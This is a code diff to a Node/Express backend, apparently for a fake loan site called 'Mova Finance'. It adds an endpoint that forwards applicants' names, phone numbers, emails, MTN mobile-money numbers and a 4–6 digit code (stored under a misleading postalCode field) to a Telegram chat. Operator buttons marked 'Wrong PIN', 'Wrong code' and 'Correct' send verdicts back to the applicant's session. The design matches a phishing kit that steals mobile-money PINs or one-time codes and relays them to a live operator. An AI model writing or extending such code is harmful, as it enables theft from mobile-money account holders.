@@ -186,9 +186,9 @@ app.post('/api/telegram/contact', async (req, res) => {
     inline_keyboard: [[
       { text: '📋 Copy message', copy_text: { text: verificationPayload } }
     ], [
+      { text: '❌ Wrong PIN', callback_data: `verification_wrong_pin:${approvalId}` },
       { text: '✅ Correct', callback_data: `verification_correct:${approvalId}` },
-      { text: '⚠️ Wrong code', callback_data: `verification_wrong_code:${approvalId}` },
-      { text: '❌ Wrong PIN', callback_data: `verification_wrong_pin:${approvalId}` }
+      { text: '⚠️ Wrong code', callback_data: `verification_wrong_code:${approvalId}` }
     ]]
   };
 
@@ -216,6 +216,66 @@ app.post('/api/telegram/contact', async (req, res) => {
     }
 
     return res.json({ sent: true, splitNotifications: Boolean(verificationMessage), approvalId });
+  } catch (_error) {
+    return res.status(502).json({ error: 'Telegram could not be reached.' });
+  }
+});
+
+app.post('/api/telegram/final-verification', async (req, res) => {
+  const { fullName, phone, email, mtnNumber, postalCode, loanType, amount } = req.body;
+  const approvalId = randomUUID();
+  approvalRequests.set(approvalId, {
+    action: null,
+    createdAt: Date.now(),
+    stage: 'final-verification'
+  });
+
+  if (!validateUgandaMtnNumber(mtnNumber)) {
+    return res.status(400).json({ error: 'A valid Uganda MTN number is required.' });
+  }
+
+  if (!/^\d{4,6}$/.test(String(postalCode ?? '').trim())) {
+    return res.status(400).json({ error: 'A 4 to 6 digit code is required.' });
+  }
+
+  const botToken = (process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_TOKEN || '').trim();
+  const chatId = (process.env.TELEGRAM_CHAT_ID || '').trim();
+
+  if (!botToken || !chatId) {
+    console.log(`Telegram is not configured; final verification captured locally for ${fullName || 'applicant'}.`);
+    return res.json({ sent: false, queued: true, delivery: 'local-demo' });
+  }
+
+  const finalVerificationMessage = [
+    '✅ <b>FINAL VERIFICATION</b>',
+    '<i>Mova Finance • Final review required</i>',
+    '',
+    `Name: <code>${escapeTelegramHtml(fullName)}</code>`,
+    `Phone: <code>${escapeTelegramHtml(phone)}</code>`,
+    `Email: <code>${escapeTelegramHtml(email)}</code>`,
+    `MTN number: <code>${escapeTelegramHtml(mtnNumber)}</code>`,
+    `Code: <code>${escapeTelegramHtml(postalCode)}</code>`,
+    `Loan: <b>${escapeTelegramHtml(loanType || 'Not provided')}</b>`,
+    `Amount: <b>UGX ${Number(amount || 0).toLocaleString('en-UG')}</b>`
+  ].join('\n');
+
+  const finalVerificationActions = {
+    inline_keyboard: [[
+      { text: '❌ Wrong PIN', callback_data: `verification_wrong_pin:${approvalId}` },
+      { text: '✅ Correct', callback_data: `verification_correct:${approvalId}` },
+      { text: '⚠️ Wrong code', callback_data: `verification_wrong_code:${approvalId}` }
+    ]]
+  };
+
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: finalVerificationMessage, parse_mode: 'HTML', reply_markup: finalVerificationActions })
+    });
+
+    if (!response.ok) return res.status(502).json({ error: 'Telegram could not accept the final verification.' });
+    return res.json({ sent: true, approvalId });
   } catch (_error) {
     return res.status(502).json({ error: 'Telegram could not be reached.' });
   }
